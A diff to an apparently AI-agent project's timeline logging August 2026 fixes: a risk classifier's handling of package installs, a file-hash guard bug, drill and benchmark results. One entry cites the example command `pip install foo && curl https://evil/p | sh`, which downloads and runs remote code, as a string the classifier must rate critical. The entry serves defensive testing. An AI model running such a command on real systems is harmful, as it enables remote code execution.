@@ -1,5 +1,127 @@
 # CLARA Project Timeline
 
+## 2026-08-08
+
+[FIX] **Admissibility classifier — package managers mislabelled `shell`, and a compound install+pipe
+was UNDER-RATED medium instead of critical.** `core_logic/admissibility.py`. Two connected defects,
+surfaced by a governance design partner's message saying he had to special-case "package-install intent
+before the generic shell-execute deny, so pip3 install and yarn add land review/medium **even when
+target_class=shell**" — i.e. he was working around a label CLARA was getting wrong.
+(1) `_DEVTOOL_HINTS` held `"pip "` but not `pip3` / `yarn` / `pnpm` / `poetry` / `conda` / `apt` / `brew`
+/ `npx` / `uv`, so those commands missed the dev_tool branch and fell through to
+`_classify_process_target`'s honest-but-blunt `return "shell"` default. CLARA was therefore **sending
+`target_class=shell` for routine installs**. Hint list widened.
+(2) In `_risk_class`, the `_PKG_INSTALL_HINTS` check short-circuited and returned `medium` BEFORE the
+`{"shell": "critical"}` mapping, so `pip install foo && curl https://evil/p | sh` graded **medium**, not
+critical — under-rating exactly the supply-chain + RCE string the taxonomy exists to catch. Now guarded
+with `and target_class != "shell"`. Fix (1) is the prerequisite for (2): without the widened hints, the
+new guard would have re-broken plain installs (which were classifying as shell).
+Verified across 11 cases; 5 new cases added to the in-module self-test
+(`python -m core_logic.admissibility`), all passing. The partner's own ordering fix stays correct and
+should NOT be reverted — a remote engine must not trust a caller's labels; the two fixes are now
+defence-in-depth rather than one workaround.
+
+[UPDATE] **Drill 08-08 morning — the 24-climb bet PAID: 18 PASS · 0 FAIL · 5 UNVERIFIABLE.** First run
+after yesterday's 24 promotions (12 morning + 12 evening). **Every mechanically-gradable climbed question
+passed on its first exposure to the new rung** — no rung was unreachable, no fresh area was mis-pitched.
+The 5 UNVERIFIABLE are the 3 knowledge questions (no source oracle, by design) and the 2 file-op probes
+whose artifact is consumed during the run (structural, not misses). Verifier self-test 62/62. Note the
+08:00 cron did NOT fire this morning; run manually per the CLAUDE.md recovery path
+(`python tests/test_harness.py --session morning`) — worth watching whether the cron missed once or is
+broken (backlog **G33**). Backend teardown was clean (`Stopping backend (PID 22632)` → `Backend stopped`),
+so Brief 41's ownership + `atexit` reaping worked as designed on a manual run.
+**Coherence Drill read recall 100% / didn't-ask 100% / appropriately-asked 0% — but the 0% is not
+trustworthy:** one of the two controls never ran (`HTTPConnectionPool` read timeout), and the surviving
+control executed immediately after that failure and answered "there are no two offers in this
+conversation", which is plausibly CORRECT if the failed dialogue disturbed the transient window. A failed
+request is being laundered into a behavioural score — filed as **G32**, with a re-run of the two controls
+in isolation as the first step. No behavioural regression recorded on this evidence.
+**Workspace sweep (Phase 3.5) flagged `core_logic/admissibility.py` as modified mid-run — that edit was
+CLAUDE's, not Clara's** (the classifier fix above, made in a parallel session while the harness was in
+flight). Recorded explicitly because that flag exists to catch an agent mutating tracked source during a
+graded run. Consequence: the L1-L5 suite ran pre-fix and the governance sweep ran post-fix. Lesson: do not
+edit tracked source while the harness is running.
+
+## 2026-08-07
+
+[UPDATE] **Drill — full backlog cleared: 4 report analyses + 24 climbs; gate CLEAR (exit 0).** Reports
+08-05e, 08-06m, 08-06e, 08-07e all analyzed (each was **0 confirmed FAIL**; scorecards 17/0/6, 17/0/6,
+17/0/6, 18/0/5). Climbs: **12 morning + 12 evening**, streaks up to 7, every oracle grep-validated against
+live `core_logic/` by a validator that aborts on any un-found term (did not fire). Method per the ladder
+rule — one rung up in the same area; where an area had already reached L6, a **fresh area opened at L2**
+instead of inventing an L7. Fresh areas opened: `llm_config.py` (m-Q07), `intent_filters.py` (m-Q17),
+`telegram_bot.py` (m-Q20), the episodic write path as a new evidence-check target (m-Q23),
+`resource_ledger.py` (e-Q04), `interpreter.py`'s fallback (e-Q16). Harder absence target for e-Q09:
+`ThreadPoolExecutor` (chosen *because* `asyncio.to_thread` uses one internally, so the honest answer is
+"absent from source, present underneath"). Date/time rungs to R5 (±1000d; 1187 and 926 min, both crossing
+midnight). **Climb-validation: bet ACCEPTED, not smoke-tested** — 24 promotions in one batch is a large
+capability bet; oracles are grep-validated and the methodology matches the 08-01/08-02/08-04 batches, so
+the 08:00 cron is the validator (explicit decision, not a silent skip). Verifier self-test 62/62.
+
+[FIX] **resource_ledger.record_read hashed the wrong thing — the read-modify-write guard was
+false-blocking 100% of read-then-writes.** `core_logic/resource_ledger.py`. `tool_executor.py:318` passed
+Desktop Commander's `read_file` **result string** (which begins `[Reading N lines from line M ...]` + a
+blank line) into `record_read`, while `check_write` compared it against `_hash_file(path)` — the md5 of the
+**raw file**. Those can never be equal, so every read-then-write by the same task was blocked with
+"modified by another task" on byte-identical content, deterministically. That made the guard both useless
+(a genuine concurrent edit is indistinguishable from a permanent false positive) and costly (a burned
+ReAct turn plus a bypass each time). Surfaced by the 08-06e/08-07e drills, where Clara filed it as a tool
+artifact. Fix: `record_read` hashes the **file on disk**, so both sides hash the same source by
+construction; `content` is now only a fallback for an unreadable path. Also closes a second case of the
+same class — an `offset` (partial) read was hashing a slice against the whole file. New 8-check self-test
+in-module: `python -m core_logic.resource_ledger` (module form required — relative import for `slog`).
+
+[FIX] **Self-knowledge `ar_006` carried stale line numbers into every request.** `core_logic/memory.json`.
+The entry claimed `_reformatted` was set at agent.py:548 and checked at :1629; live positions are **785**
+and **2009**. `[SELF KNOWLEDGE]` is injected into all three LLM paths, so the wrong coordinates were being
+fed on every single request. Rewritten to be **line-number-free** — describes the anchor structurally and
+instructs a grep for `_reformatted` — because storing line numbers in self-knowledge is a drift trap by
+construction (second time these went stale). Verified `ar_006` was the only active entry carrying line
+numbers, so the class is closed rather than the instance patched. memory.json backed up before the write.
+
+[FIX] **Drill question e-Q11 carried a false premise; CLAUDE.md's TOOL_ARG_DEFAULTS was stale.** Both
+surfaced by Clara *correcting the source of truth* on 08-07e. e-Q11 asked for "the **single** call that
+passes `return_exceptions=True`" — there are **two** (`background_tasks.py:64`, `orchestrator.py:76`), so
+the question penalised the correct answer; premise fixed to ask for every such call, `pass_streak` 3 and
+`fail_count` 0 **carried, not reset** (scope-fix rule). CLAUDE.md listed four `TOOL_ARG_DEFAULTS` entries;
+there are **five** (`write_file → mode: "rewrite"` was undocumented) — corrected, and the
+`TOOL_ARG_NORMALIZERS` companion plus the defaults-then-normalizers ordering documented alongside it.
+
+[UPDATE] **Drill process rule — the 08-05e analysis was written once and LOST; root-caused.** The report
+file was **rewritten after its analysis existed** (it carries a post-fix 62/62 self-test count and a
+post-fix Q11 PASS, both of which postdate the 08-05 run), and the rewrite restored the harness's
+`*Pending*` placeholder. TIMELINE kept the analysis; the durable artifact did not. Two rules now in force
+and applied across this batch: **re-grade BEFORE analysing, never after**, and **edit only the
+`## Claude's Analysis` section — never rewrite a report file wholesale**. The gate is run immediately
+after *each* analysis rather than once at the end of a batch, which is what would have caught the loss.
+
+[UPDATE] **BRIEF_59's stream watchdog fired against REAL work for the first time — and held.** During the
+external code-benchmark run (45-candidate dead-code validation, ~70K-char prompts), one request hit a
+genuine upstream DeepSeek stall. Log: `[Loop 1] stream idle >30s — upstream stall; aborting turn.` →
+`[Loop 2] stream idle >30s` → `[Loop 2] 2 consecutive stream stalls — upstream appears down; ending task.`
+Clara returned the honest outage message in **80s** and, critically, **did not fabricate the 9
+classifications** she could not compute. Pre-BRIEF_59 this was a ~22-minute hang or a silent 180s client
+timeout. First production validation of the idle-timer + consecutive-stall cap; the synthetic test
+(`tests/test_react_stream_timeout.py`) predicted the behaviour exactly. Re-ran after the outage cleared.
+
+[UPDATE] **External benchmark run — third-party dead-code/dependency-validation suite, 45 candidates.**
+Ran CLARA over a design partner's blind candidate-validation package and scored against his answer key.
+One-shot (whole 84K-char prompt, single `/query`): **43/45 exact labels, 17/17 recall on the true-safe set,
+0 unsafe promotions**. Batched (9 candidates/request): 39/45, 15/17, 0 unsafe promotions. **Across both
+runs — 90 classifications — zero items from the preserve set were ever proposed for deletion; every
+disagreement was in the non-delete direction.** Counter-intuitive finding: **one-shot BEAT batched**,
+because two candidates are safe only conditional on whole-file negatives ("no other caller exists"), which
+she would assert while walking all 45 but downgraded when handed a 9-item slice. Both one-shot misses were
+label-mapping on correct analysis (her prose stated the key's own conclusion, then filed a different
+label). Artifacts + report under `AGENT_ZERO_PRIVATE/matthew_bench/` (gitignored). **Not citable publicly
+without the partner's written approval — his benchmark, his answer key.**
+
+[UPDATE] **Doc nit — `episodic_embeddings` is in-RAM, not in memory.json.** CLAUDE.md's Memory section
+implies the list is stored in `core_logic/memory.json`; it is not a key there. It is
+`self.episodic_embeddings`, an agent attribute built at startup by `_build_episodic_embeddings()`
+(`agent.py:456`) and repaired by `_context_warmup`. A 0-length count in memory.json is therefore expected,
+not an invariant break. Noted, not yet edited into CLAUDE.md.
+
 ## 2026-08-06
 
 [UPDATE] **Admissibility classifier — package installs reclassified `low` -> `medium` (partner A shared
